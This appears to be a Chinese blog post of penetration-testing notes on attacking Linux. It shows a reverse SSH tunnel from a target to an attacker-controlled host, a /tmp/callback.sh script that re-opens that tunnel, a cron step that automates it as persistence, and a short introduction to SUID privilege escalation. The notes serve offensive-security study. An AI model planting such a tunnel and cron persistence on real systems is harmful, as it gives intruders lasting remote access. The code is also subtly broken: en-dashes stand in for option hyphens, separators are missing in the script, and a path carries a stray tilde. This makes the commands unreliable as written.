---
title: 网络攻防实战 Linux攻击
tags: 网络攻防实战
categories: Technologyf反向连接
---

* 反向连接

  * target（受控端）主动连接attacker控制端），在主机A和主机B之间建立一个远程连接，通过这个连
    接主机B可以主动的向主机A发送一些请求

   `ssh –N –R 54321:localhost:22 royce@10.0.10.160 –i /root/.ssh/pentestkey`

  * `-R`: 反向连接( 若用`-L`是正向连接 )
  * 靶机监听22号端口,要求攻击机打开54321端口,以后对攻击机的访问相当于对靶机的访问,即: attacker对port 54321的操作,在target眼中相当于在本机的port 22的操作

* ```shell
  
  ```

* Create a bash script` /tmp/callback.sh`

  ```Shell
  #!/bin/bash 
  createTunnel(){ /usr/bin/ssh -N -R 54321:localhost:22
  pentest@10.0.2.10 –i /root/.ssh/pentestkey }
  /bin/pidof ssh if [[ $? -ne 0 ]]; then createTunnel
  fi
  ```

* Automate an SSH tunnel with **cron**

  ```Shell
  chmod 700 /tmp/callback.sh~
  crontab -e
  ```

* Escalate privileges with SUID binaries

  * ```Shell
    # ls -l /usr/bin/passwd                                            2 ⨯ 1 ⚙
    -rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
    ```

    可以看到`passwd`的执行权限是`s`而非通常的`x`,代表`SUID`